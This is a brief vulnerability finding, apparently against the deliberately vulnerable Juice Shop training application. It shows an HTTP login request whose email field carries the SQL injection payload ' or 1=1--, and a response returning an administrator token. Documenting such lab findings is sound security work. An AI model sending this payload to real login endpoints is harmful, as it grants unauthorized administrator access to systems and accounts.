SQL Injection vulnerability in a login endpoint allows authenticate as a administrator.

HTTP Request:

POST /rest/user/login HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0
Content-Type: application/json

{"email":"' or 1=1--","password":"123"}

HTTP Response:

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 1337

{"authentication":{"token":"xyz","bid":1,"umail":"admin@juice-sh.op"}}

The application improperly handles user input in the email input, leading to an SQL Injection vulnerability.
